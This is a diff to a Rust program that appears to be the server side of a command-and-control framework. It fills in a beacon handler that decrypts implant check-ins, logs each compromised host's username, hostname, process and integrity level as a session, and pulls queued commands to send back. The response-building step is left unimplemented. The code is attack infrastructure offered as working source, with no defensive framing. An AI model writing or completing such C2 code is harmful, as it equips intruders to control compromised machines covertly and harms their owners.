@@ -4,8 +4,11 @@ use std::{env::args, net::SocketAddr};
 
 use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
 use axum::{Router, routing::post};
+use axum::body::Bytes;
+use axum::http::StatusCode;
+use axum::extract::State;
 use chrono::{DateTime, Utc};
-use serde::Serialize;
+use serde::{Deserialize, Serialize};
 use tokio::sync::RwLock;
 use sha2::{Digest, Sha256};
 
@@ -41,6 +44,20 @@ impl Crypto {
     }
 }
 
+#[derive(Debug, Deserialize)]
+struct BeaconData {
+    session_id: String,
+    hostname: String,
+    username: String,
+    os: String,
+    pid: u32,
+    process: String,
+    arch: String,
+    integrity: String,
+    timestamp: i64,
+    metadata: serde_json::Value,
+}
+
 #[derive(Debug, Clone)]
 struct Session {
     id: String,
@@ -72,7 +89,63 @@ struct AppState {
     results: RwLock<Vec<(String, String, bool, String)>>,
 }
 
-async fn handle_beacon() {
+async fn handle_beacon(State(state): State<Arc<AppState>>, body: Bytes) -> Result<Bytes, StatusCode> {
+    // Decrypt
+    let plaintext = state.crypto.decrypt(&body).map_err(|e| {
+        eprintln!("[x] Decrypt failed: {}", e);
+        StatusCode::BAD_REQUEST
+    })?;
+
+    // Parse beacon data
+    let data: BeaconData = serde_json::from_slice(&plaintext).map_err(|e| {
+        eprintln!("[x] JSON parse failed: {}", e);
+        StatusCode::BAD_REQUEST
+    })?;
+
+    let now = Utc::now();
+
+    // Update or create session
+    let mut sessions = state.sessions.write().await;
+    let is_new = !sessions.contains_key(&data.session_id);
+
+    let session = sessions.entry(data.session_id.clone()).or_insert_with(|| {
+        Session {
+            id: data.session_id.clone(),
+            hostname: data.hostname.clone(),
+            username: data.username.clone(),
+            os: data.os.clone(),
+            pid: data.pid,
+            process: data.process.clone(),
+            arch: data.arch.clone(),
+            integrity: data.integrity.clone(),
+            first_seen: now,
+            last_seen: now,
+            checkins: 0,
+        }
+    });
+    session.last_seen = now;
+    session.checkins += 1;
+
+    if is_new {
+        println!("* NEW SESSION     {}", data.session_id);
+        println!("    -> {}@{}", data.username, data.hostname);
+        println!("    -> {} | PID {} | {}", data.os, data.pid, data.arch);
+        println!("    -> Integrity: {}", data.integrity);
+    } 
+    drop(sessions);
+
+    // Check if pending commands
+    let mut pending = state.pending_command.write().await;
+    let commands = pending.remove(&data.session_id).unwrap_or_default();
+
+    if !commands.is_empty() {
+        println!("  ^ Sending {} command(s) to {}", commands.len(), data.session_id);
+        for cmd in &commands {
+            println!("    * [{}] {} {:?}", cmd.id, cmd.command_type, cmd.args);
+        }
+    }
+
+    // TODO: Build response
     unimplemented!()
 }
 
